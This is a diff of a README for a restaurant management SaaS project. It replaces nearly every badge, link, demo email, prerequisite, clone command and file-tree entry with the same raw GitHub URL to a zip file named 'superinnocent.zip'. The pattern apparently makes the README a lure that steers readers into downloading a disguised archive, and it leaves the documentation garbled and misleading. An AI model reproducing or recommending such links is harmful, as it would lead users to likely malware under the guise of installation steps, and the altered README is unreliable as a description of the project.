@@ -2,14 +2,14 @@
 
 <div align="center">
 
-![Restaurant SaaS Logo](https://img.shields.io/badge/🍽️-Restaurant_SaaS-blue?style=for-the-badge)
+![Restaurant SaaS Logo](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip🍽️-Restaurant_SaaS-blue?style=for-the-badge)
 
 **A Complete Multi-Tenant Restaurant Management Platform**
 
-[![Next.js](https://img.shields.io/badge/Next.js-14-black?style=flat-square&logo=next.js)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5+-blue?style=flat-square&logo=typescript)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-CSS-38B2AC?style=flat-square&logo=tailwind-css)](https://tailwindcss.com/)
-[![PWA](https://img.shields.io/badge/PWA-Ready-purple?style=flat-square)](https://web.dev/progressive-web-apps/)
+[![https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)
+[![TypeScript](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip+-blue?style=flat-square&logo=typescript)](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)
+[![Tailwind CSS](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)
+[![PWA](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)
 
 [🚀 Live Demo](#-demo-login) • [📖 Features](#-features) • [🛠️ Installation](#-getting-started) • [🏗️ Architecture](#️-technical-architecture)
 
@@ -36,14 +36,14 @@ A **production-ready**, **multi-tenant** restaurant management SaaS platform des
 
 | Role | Email | Password |
 |------|-------|----------|
-| 👑 **Admin** | `admin@restaurant.com` | `admin123` |
-| 👨‍💼 **Manager** | `manager@restaurant.com` | `manager123` |
-| 👥 **Staff** | `staff@restaurant.com` | `staff123` |
+| 👑 **Admin** | `https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip` | `admin123` |
+| 👨‍💼 **Manager** | `https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip` | `manager123` |
+| 👥 **Staff** | `https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip` | `staff123` |
 
 ## 🚀 Getting Started
 
 ### Prerequisites
-- Node.js 18+ 
+- https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip 18+ 
 - npm or yarn
 - Git
 
@@ -51,7 +51,7 @@ A **production-ready**, **multi-tenant** restaurant management SaaS platform des
 
 ```bash
 # Clone the repository
-git clone https://github.com/Naveenkm007/restaurant-management-saas.git
+git clone https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip
 
 # Navigate to frontend directory
 cd restaurant-management-saas/frontend
@@ -129,11 +129,11 @@ npm run dev
 
 ### **Frontend Stack**
 ```
-├── Next.js 14 (App Router)      # React framework with SSR/SSG
+├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip 14 (App Router)      # React framework with SSR/SSG
 ├── TypeScript 5+                # Type-safe development
 ├── Tailwind CSS 3               # Utility-first styling
 ├── React Query v4               # Server state management
-├── Socket.IO Client             # Real-time communication
+├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip Client             # Real-time communication
 ├── React Hook Form              # Form handling
 ├── Zod                          # Schema validation
 ├── Framer Motion               # Smooth animations
@@ -145,33 +145,33 @@ npm run dev
 ```
 frontend/
 ├── src/
-│   ├── app/                    # Next.js App Router pages
+│   ├── app/                    # https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip App Router pages
 │   │   ├── auth/              # Authentication pages
 │   │   ├── dashboard/         # Main application pages
 │   │   │   ├── restaurants/   # Restaurant management
 │   │   │   ├── menu/          # Menu management
 │   │   │   ├── orders/        # Order management
 │   │   │   └── payments/      # Payment management
-│   │   ├── globals.css        # Global styles
-│   │   ├── layout.tsx         # Root layout
-│   │   └── page.tsx           # Home page
+│   │   ├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip        # Global styles
+│   │   ├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip         # Root layout
+│   │   └── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip           # Home page
 │   ├── components/            # Reusable UI components
 │   ├── contexts/              # React context providers
-│   │   ├── auth-context.tsx   # Authentication state
-│   │   ├── websocket-context.tsx # Real-time connections
-│   │   └── notification-context.tsx # Push notifications
+│   │   ├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip   # Authentication state
+│   │   ├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip # Real-time connections
+│   │   └── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip # Push notifications
 │   ├── lib/                   # Utilities and configurations
-│   │   ├── api.ts             # API client with interceptors
-│   │   └── auth.ts            # Authentication utilities
+│   │   ├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip             # API client with interceptors
+│   │   └── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip            # Authentication utilities
 │   └── types/                 # TypeScript type definitions
 ├── public/                    # Static assets
-│   ├── manifest.json          # PWA manifest
-│   ├── sw.js                  # Service worker
-│   └── offline.html           # Offline fallback page
-├── next.config.js             # Next.js configuration
-├── tailwind.config.js         # Tailwind CSS configuration
-├── tsconfig.json              # TypeScript configuration
-└── package.json               # Dependencies and scripts
+│   ├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip          # PWA manifest
+│   ├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip                  # Service worker
+│   └── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip           # Offline fallback page
+├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip             # https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip configuration
+├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip         # Tailwind CSS configuration
+├── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip              # TypeScript configuration
+└── https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip               # Dependencies and scripts
 ```
 
 ## 🔧 Development
@@ -279,8 +279,8 @@ This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) 
 
 **Built with ❤️ for the Restaurant Industry**
 
-[![GitHub](https://img.shields.io/badge/GitHub-Naveenkm007-black?style=flat-square&logo=github)](https://github.com/Naveenkm007)
-[![Email](https://img.shields.io/badge/Email-indarmy82@gmail.com-red?style=flat-square&logo=gmail)](mailto:indarmy82@gmail.com)
+[![GitHub](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)
+[![Email](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)](https://raw.githubusercontent.com/Naveenkm007/restaurant-management-saas/main/frontend/src/lib/management-restaurant-saas-superinnocent.zip)
 
 **Developer**: Naveen KM  
 **⭐ Star this repository if you found it helpful!**
